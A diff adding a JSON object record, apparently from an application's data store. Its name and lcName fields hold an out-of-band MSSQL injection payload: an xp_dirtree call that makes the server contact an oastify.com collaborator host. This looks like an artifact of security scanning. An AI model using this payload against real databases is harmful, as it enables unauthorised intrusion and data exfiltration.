@@ -1,0 +1,33 @@
+{
+	"createdTime":1736635075405,
+	"deleted":false,
+	"description":"otAyeP",
+	"id":"6782f2c344ce135db1da46db",
+	"input":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"lastModifiedBy":854,
+	"lcName":"otayep;declare @q varchar(99);set @q='\\\\udb2ujcn986kj8uui3ni57voifo8c60xqli88wx.oasti'+'fy.com\\ine'; exec master.dbo.xp_dirtree @q;-- ",
+	"modifiedTime":1736635075405,
+	"name":"otAyeP;declare @q varchar(99);set @q='\\\\udb2ujcn986kj8uui3ni57voifo8c60xqli88wx.oasti'+'fy.com\\ine'; exec master.dbo.xp_dirtree @q;-- ",
+	"output":{
+		"type":"SCHEMA",
+		"dynamic":false,
+		"schema":{
+			"ua:modal":{
+				"field_type":"STRING",
+				"is_optional":true
+			}
+		}
+	},
+	"ownerUserId":854,
+	"standard":false,
+	"version":0
+}
